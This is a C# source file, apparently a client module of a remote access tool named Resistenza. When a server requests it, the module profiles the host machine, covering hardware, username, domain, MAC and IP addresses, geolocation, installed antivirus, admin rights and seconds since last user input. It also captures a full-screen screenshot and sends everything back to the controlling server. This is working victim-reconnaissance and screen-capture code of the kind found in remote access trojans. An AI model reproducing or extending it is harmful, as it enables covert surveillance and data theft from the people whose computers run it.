using Newtonsoft.Json;
using Resistenza.Common.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

using System.Windows.Forms;




namespace Resistenza.Common.Packets.MachineInformation
{
    public class ExtendedComputerInfoRequest
    {
        public string Type { get; set; }
       
        public ExtendedComputerInfoRequest() {
            Type = this.GetType().ToString();
        }



        [StructLayout(LayoutKind.Sequential)]
        struct LASTINPUTINFO
        {
            public uint cbSize;
            public uint dwTime;
        }

        [DllImport("user32.dll")]
        static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [DllImport("kernel32")]
        extern static UInt64 GetTickCount64();
        private string _PublicIp;

        public async Task HandleAsync(SecureStream Server)
        {


            Task<string> GetWanIpT = Task.Run(() => GetWanIp());
            Task<string> GetCountryT = Task.Run(() => GetCountry());
            Task<string> GetISPT = Task.Run(() => GetISP());
            Task<byte[]> GetScreenshotT= Task.Run(() => TakeScreenshot());



            ExtendedComputerInfoResponse Info = new ExtendedComputerInfoResponse()
            {
                OperatingSytem = GetOperatingSystem(),
                Architecture = GetArchitecture(),
                Processor = GetProcessor(),
                Memory = GetRam(),
                GPU = GetGraphicCard(),
                Username = System.Environment.UserName,
                PCName = System.Environment.MachineName,
                DomainName = System.Environment.UserDomainName,
                HostName = System.Net.Dns.GetHostName(),
                SystemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)), //la partizione su cui è installato il sistema operativo
                UpTime = GetUpTime(),
                MAC = GetMacAddress(),
                LanIp = GetLanIp(),
                WanIp = await GetWanIpT,
                Country = await GetCountryT,
                ISP = await GetISPT,
                Antivirus = GetAntivirus(),
                IsAdmin = IsAdmin(),
                LocalTime = GetLocalTime(),
                SecondsFromLastInput = GetSecondsFromLastInput(),
                MainDriveSize = GetFixedDriveStorage(),
                ScreenshotBytes = await GetScreenshotT
            };

            await Server.SendPacketAsync(Info);
            
        }

        static string GetFixedDriveStorage()
        {

            foreach(DriveInfo Drive in DriveInfo.GetDrives())
            {
                if(Drive.DriveType == DriveType.Fixed)
                {
                    return FormatBytes(Drive.TotalSize); 
                }
            }

            return "N/D";
        }

        private static string FormatBytes(long bytes)
        {
            string[] Suffix = { "B", "KB", "MB", "GB", "TB" };
            int i;
            double dblSByte = bytes;
            for (i = 0; i < Suffix.Length && bytes >= 1024; i++, bytes /= 1024)
            {
                dblSByte = bytes / 1024.0;
            }

            return String.Format("{0:0.##} {1}", dblSByte, Suffix[i]);
        }

        static string GetSecondsFromLastInput()
        {
            LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);


            GetLastInputInfo(ref lastInputInfo);
            uint lastInputTime = lastInputInfo.dwTime;
            uint millisecondsSinceLastInput = (uint)Environment.TickCount - lastInputTime;
            decimal Seconds = Math.Round((decimal)millisecondsSinceLastInput / 1000, 1);

            return Seconds.ToString() + " s";

        }

        static string GetLocalTime()
        {          
            DateTime Now = DateTime.Now;
            return Now.ToString();                      
        }

        static string IsAdmin()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator) ? "true" : "false";
            }
        }

        static string GetAntivirus()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "SELECT * FROM AntivirusProduct");
            ManagementObjectCollection data = searcher.Get();
            if (data.Count == 0) { return "None"; }
            ManagementObject ManagementObj = data.OfType<ManagementObject>().FirstOrDefault();
            return ManagementObj["displayName"].ToString();

        }

        string GetISP()
        {
            string ipAddress =  _PublicIp; // Sostituisci con l'indirizzo IP di interesse

            using (var client = new WebClient())
            {
                try
                {
                    string response = client.DownloadString($"https://ipinfo.io/{ipAddress}/json");
 
                    // Analizza il JSON per ottenere l'ISP
                    string isp = response.Split("\"org\":")[1].Split(",")[0].Trim('"').Replace("\"", "").Trim();
                    return isp;
                }
                catch (WebException ex)
                {
                    return string.Empty;
                }
            }
        }

        string GetCountry()
        {
            IpInfo ipInfo = new IpInfo();
            try
            {
                string info = new WebClient().DownloadString("http://ipinfo.io/" + _PublicIp);
                ipInfo = JsonConvert.DeserializeObject<IpInfo>(info);
                RegionInfo myRI1 = new RegionInfo(ipInfo.Country);
                ipInfo.Country = myRI1.EnglishName;
            }
            catch (Exception)
            {
                ipInfo.Country = string.Empty;
            }

            return ipInfo.Country;
        }

        string GetWanIp()
        {
            string externalIpString = new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim();
            var externalIp = IPAddress.Parse(externalIpString);
            _PublicIp = externalIp.ToString();
            
            return externalIp.ToString();
        }

        static string GetLanIp()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }

            return string.Empty;
        }

        static string GetMacAddress()
        {
            NetworkInterface FirstInterface = NetworkInterface.GetAllNetworkInterfaces()[0];
            return FirstInterface.GetPhysicalAddress().ToString();
        }

        static string GetUpTime()
        {
            TimeSpan UpTime = TimeSpan.FromMilliseconds(GetTickCount64());

            string days = UpTime.Days > 0 ? $"{UpTime.Days.ToString()} d, " : string.Empty;
            string hours = UpTime.Hours > 0 && days != string.Empty ? $"{UpTime.Days.ToString()} h, " : string.Empty;
            string minutes = $"{UpTime.Minutes.ToString()} m";

            string UpTimeString = days + hours + minutes;   

            return UpTimeString;
        }

        static string GetOperatingSystem()
        {
            string os = QueryWMI("SELECT Caption FROM Win32_OperatingSystem");
            return os;
        }

        static string GetGraphicCard()
        {
            string GPU = QueryWMI("SELECT Name FROM Win32_VideoController");
            return GPU;
        }

        static string GetArchitecture()
        {
            return System.Runtime.InteropServices.RuntimeInformation.OSArchitecture.ToString(); 
        }

        static string GetProcessor()
        {
            string Processor = QueryWMI("SELECT Name FROM Win32_Processor");
            return Processor;
        }

        static string GetRam()
        {
          
            string RamString = QueryWMI("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
            long RamInBytes = Int64.Parse(RamString);
            double GigaBytes = RamInBytes / Math.Pow(1024, 3);
            double TotalRamInGigabytes = Math.Round(GigaBytes);


            return TotalRamInGigabytes.ToString() + "GB";
        }

        static string QueryWMI(string Query)
        {
            string Property = Query.Replace("SELECT ", "").Substring(0, Query.Replace("SELECT ", "").IndexOf(" "));
            var Data = (from x in new ManagementObjectSearcher(Query).Get().Cast<ManagementObject>()
                        select x.GetPropertyValue(Property)).FirstOrDefault();

            return Data.ToString();
        }

        static byte[] TakeScreenshot()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }

                using(MemoryStream ms =  new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Png);
                    return ms.ToArray();    
                }

                
            }

        }
    }

    public class IpInfo
    {
        [JsonProperty("ip")]
        public string Ip { get; set; }

        [JsonProperty("hostname")]
        public string Hostname { get; set; }

        [JsonProperty("city")]
        public string City { get; set; }

        [JsonProperty("region")]
        public string Region { get; set; }

        [JsonProperty("country")]
        public string Country { get; set; }

        [JsonProperty("loc")]
        public string Loc { get; set; }

        [JsonProperty("org")]
        public string Org { get; set; }

        [JsonProperty("postal")]
        public string Postal { get; set; }
    }
}
